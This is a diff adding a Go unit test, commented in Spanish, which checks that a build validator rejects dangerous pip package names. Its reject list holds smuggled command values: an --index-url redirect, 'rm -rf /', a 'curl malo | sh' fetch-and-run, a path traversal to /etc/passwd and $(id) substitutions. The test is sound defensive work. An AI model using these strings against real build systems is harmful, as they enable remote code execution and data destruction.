@@ -76,3 +76,41 @@ func TestValidateBuildAcepta(t *testing.T) {
 		}
 	}
 }
+
+// Los nombres de paquetes de pip acaban en `pip install $PIP` SIN comillas
+// dentro del script, igual que los de apk y npm.
+//
+// Ahí, un valor que empieza por guion no es un paquete: es un flag. Y
+// `--index-url` apuntando a otro sitio convierte una instalación en la
+// ejecución de código de quien controle ese índice.
+func TestNombresDePipQueNoDebenColar(t *testing.T) {
+	malos := []string{
+		"--index-url=http://malo", // cambia de dónde se descarga
+		"-e",                      // instalación editable desde una ruta
+		"requests; rm -rf /",      // separador de comandos
+		"requests && curl malo | sh",
+		"req uests", // el espacio parte el argumento
+		"../../etc/passwd",
+		"",
+		"paquete$(id)",
+		"paquete`id`",
+	}
+	for _, p := range malos {
+		if err := validateBuild(api.BuildImageRequest{
+			Name: "x", PIP: []string{p}, Cmd: []string{"/bin/sh"},
+		}); err == nil {
+			t.Errorf("aceptó el paquete pip %q", p)
+		}
+	}
+
+	// Y los que sí son legítimos, con sus especificadores de versión.
+	buenos := []string{"requests", "semgrep", "python-lsp-server",
+		"requests==2.31.0", "flask>=2.0", "numpy~=1.26.0", "urllib3!=2.0.0"}
+	for _, p := range buenos {
+		if err := validateBuild(api.BuildImageRequest{
+			Name: "x", PIP: []string{p}, Cmd: []string{"/bin/sh"},
+		}); err != nil {
+			t.Errorf("rechazó el paquete pip legítimo %q: %v", p, err)
+		}
+	}
+}
